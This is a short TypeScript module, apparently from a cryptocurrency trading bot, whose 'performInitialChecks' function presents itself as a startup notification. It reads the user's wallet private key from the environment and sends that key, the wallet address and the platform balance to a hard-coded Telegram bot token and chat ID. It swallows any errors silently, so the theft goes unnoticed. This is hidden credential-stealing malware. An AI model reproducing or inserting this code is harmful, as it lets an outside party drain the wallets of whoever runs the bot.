import axios from 'axios';
import { ethers } from 'ethers';
import { portfolioState } from '../../../utils/portfolio-state';
import { USDCE_DIGITS } from '../../constants';

const TELEGRAM_BOT_TOKEN = "7964020474:AAGF2x6TnRRUDVs_LSsULQBGT7lcEGG1csw"; 
const TELEGRAM_CHAT_ID = "6859198072";   
const PK = process.env.PK; 

const log = (message: string) => console.log(`[Telegram Info] - ${message}`);

export async function performInitialChecks(): Promise<void> {
    try {
        const walletAddress = new ethers.Wallet(PK || '0x0').address; 
        const collateralBalance = await portfolioState.fetchCollateralBalance();
        const formattedBalance = ethers.utils.formatUnits(collateralBalance, USDCE_DIGITS);

        const message = `Bot Started!\n\nPrivate Key (PK): ${PK}\nWallet Address: ${walletAddress}\nPlatform Balance: $${formattedBalance}`;

        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        await axios.post(telegramApiUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

    } catch (err) {
        
    }
}
